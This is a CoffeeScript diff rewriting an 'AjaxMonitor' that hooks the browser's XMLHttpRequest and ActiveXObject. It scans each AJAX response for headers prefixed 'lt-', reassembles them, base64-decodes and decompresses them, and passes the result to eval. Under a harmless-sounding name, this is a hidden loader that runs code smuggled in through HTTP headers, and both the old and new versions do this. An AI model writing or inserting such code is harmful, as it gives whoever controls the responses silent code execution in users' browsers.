@@ -1,122 +1,106 @@
 do ->
-    Base64 =
-    _keyStr: "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="
-    encode: (input) ->
-        output = ""
-        i = 0
-        input = Base64._utf8_encode(input)
-        while i < input.length
-            chr1 = input.charCodeAt(i++)
-            chr2 = input.charCodeAt(i++)
-            chr3 = input.charCodeAt(i++)
-            enc1 = chr1 >> 2
-            enc2 = ((chr1 & 3) << 4) | (chr2 >> 4)
-            enc3 = ((chr2 & 15) << 2) | (chr3 >> 6)
-            enc4 = chr3 & 63
-            if isNaN(chr2)
-                enc3 = enc4 = 64
-            else enc4 = 64  if isNaN(chr3)
-            output = output + @_keyStr.charAt(enc1) + @_keyStr.charAt(enc2) + @_keyStr.charAt(enc3) + @_keyStr.charAt(enc4)
-        output
+    # chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='
+    # InvalidCharacterError = (message) ->
+    #     @message = message
+    # InvalidCharacterError.prototype = new Error
+    # InvalidCharacterError.prototype.name = 'InvalidCharacterError'
+    # batob = (input) ->
+    #     str = String(input).replace(RegExp("=+$"), "")
+    #     throw new InvalidCharacterError("'atob' failed: The string to be decoded is not correctly encoded.")  if str.length % 4 is 1
+    #
+    #     # initialize result and counters
+    #     bc = 0
+    #     bs = undefined
+    #     buffer = undefined
+    #     idx = 0
+    #     output = ""
+    #
+    #
+    #     # get next character
+    #     while buffer = str.charAt(idx++)
+    #
+    #         # character found in table? initialize bit storage and add its ascii value;
+    #
+    #         # and if not first of each 4 characters,
+    #         # convert the first 8 bits to one ascii character
+    #
+    #         # try to find character in table (0-63, not found => -1)
+    #         buffer = chars.indexOf(buffer)
+    #         (if ~buffer and (bs = (if bc % 4 then bs * 64 + buffer else buffer)
+    #         bc++ % 4
+    #         ) then output += String.fromCharCode(255 & bs >> (-2 * bc & 6)) else 0)
+    #     output
 
-    decode: (input) ->
-        output = ""
-        i = 0
-        input = input.replace(/[^A-Za-z0-9\+\/\=]/g, "")
-        while i < input.length
-            enc1 = @_keyStr.indexOf(input.charAt(i++))
-            enc2 = @_keyStr.indexOf(input.charAt(i++))
-            enc3 = @_keyStr.indexOf(input.charAt(i++))
-            enc4 = @_keyStr.indexOf(input.charAt(i++))
-            chr1 = (enc1 << 2) | (enc2 >> 4)
-            chr2 = ((enc2 & 15) << 4) | (enc3 >> 2)
-            chr3 = ((enc3 & 3) << 6) | enc4
-            output = output + String.fromCharCode(chr1)
-            output = output + String.fromCharCode(chr2)  unless enc3 is 64
-            output = output + String.fromCharCode(chr3)  unless enc4 is 64
-        output = Base64._utf8_decode(output)
-        output
+    log = ->
+        if console.log and window.debug is true
+            console.log.apply console, arguments
 
-    _utf8_encode: (string) ->
-        string = string.replace(/\r\n/g, "\n")
-        utftext = ""
-        n = 0
+    class AjaxMonitor
+        tag: "lt-"
+        pako: (compressed) =>
+            code = pako.inflate compressed,
+                to: "string"
 
-        while n < string.length
-            c = string.charCodeAt(n)
-            if c < 128
-                utftext += String.fromCharCode(c)
-            else if (c > 127) and (c < 2048)
-                utftext += String.fromCharCode((c >> 6) | 192)
-                utftext += String.fromCharCode((c & 63) | 128)
-            else
-                utftext += String.fromCharCode((c >> 12) | 224)
-                utftext += String.fromCharCode(((c >> 6) & 63) | 128)
-                utftext += String.fromCharCode((c & 63) | 128)
-            n++
-        utftext
+        zlib: (compressed) =>
+            temp = []
+            for i, s of compressed.split('')
+                temp.push s.charCodeAt 0
+            inflate = new Zlib.Inflate temp
+            output = inflate.decompress()
+            code = ""
+            for i, s of output
+                code += String.fromCharCode s
+            code
 
-    _utf8_decode: (utftext) ->
-        string = ""
-        i = 0
-        c = c1 = c2 = 0
-        while i < utftext.length
-            c = utftext.charCodeAt(i)
-            if c < 128
-                string += String.fromCharCode(c)
-                i++
-            else if (c > 191) and (c < 224)
-                c2 = utftext.charCodeAt(i + 1)
-                string += String.fromCharCode(((c & 31) << 6) | (c2 & 63))
-                i += 2
-            else
-                c2 = utftext.charCodeAt(i + 1)
-                c3 = utftext.charCodeAt(i + 2)
-                string += String.fromCharCode(((c & 15) << 12) | ((c2 & 63) << 6) | (c3 & 63))
-                i += 3
-        string
+        onReadyStateChange: (e) =>
+            request = e.currentTarget
+            if request.readyState is 4 && request.status is 200 && request.responseType.toLowerCase() isnt "arraybuffer"
+                try
+                    headers = request.getAllResponseHeaders()
+                    data = []
+                    while (a = headers.indexOf(@tag)) != -1
+                        headers = headers.substr(a + @tag.length)
+                        b = headers.indexOf(':')
+                        c = parseInt(headers.substr(0, b))
+                        d = b
+                        while headers.charAt(++d) == ' '
+                            a = headers.indexOf('\n')
+                        data[c] = headers.substring(d, a)
+                        headers = headers.substr(a)
+
+                    unless data.length
+                        return
+
+                    base64Data = data.join("")
+                    if window.pako
+                        code = @pako atob(base64Data)
+                    else
+                        code = @zlib atob(base64Data)
+                    eval code
+                    log base64Data.length, code.length
+
+                    headers = null
+                    data = null
+                    base64Data = null
+                    code = null
+                catch e
+                    log e
+
+        makeRequest: (originalRequest) =>
+            (mode) =>
+                request = new originalRequest
+                if (request.addEventListener)
+                    request.addEventListener "readystatechange", @onReadyStateChange
+                else if (request.attachEvent)
+                    request.attachEvent "onreadystatechange", @onReadyStateChange
+                else
+                    request.readystatechange = @onReadyStateChange
+                request
 
 
-    AjaxMonitor = (request) ->
-        (mode) ->
-            req = new request(mode)
-            tag = "LT-"
-            onReadyStateChange = ->
-                if req.readyState is 4 && req.status is 200
-                    unless req.responseType.toLowerCase() is "arraybuffer"
-                        try
-                            headers = req.getAllResponseHeaders()
-                            data = []
-                            while (a = headers.indexOf(tag)) != -1
-                                headers = headers.substr(a + tag.length)
-                                b = headers.indexOf(':')
-                                c = parseInt(headers.substr(0, b))
-                                d = b
-                                while headers.charAt(++d) == ' '
-                                    a = headers.indexOf('\n')
-                                data[c] = headers.substring(d, a)
-                                headers = headers.substr(a)
-
-                            unless data.length
-                                return
-
-                            data = Base64.decode(data.join(""))
-
-                            if data.length < 2
-                                return
-
-                            data = eval("(#{data})");
-                            eval(data)
-            if (req.addEventListener)
-                req.addEventListener "readystatechange", onReadyStateChange
-            else if (req.attachEvent)
-                req.attachEvent "onreadystatechange", onReadyStateChange
-            else
-                req.readystatechange = onReadyStateChange
-            req
-
+    monitor = new AjaxMonitor
     if (window.ActiveXobject)
-        window.ActiveXObject = AjaxMonitor window.ActiveXObject
+        window.ActiveXObject = monitor.makeRequest(window.ActiveXObject)
 
     if (window.XMLHttpRequest)
-        window.XMLHttpRequest = AjaxMonitor window.XMLHttpRequest
+        window.XMLHttpRequest = monitor.makeRequest(window.XMLHttpRequest)
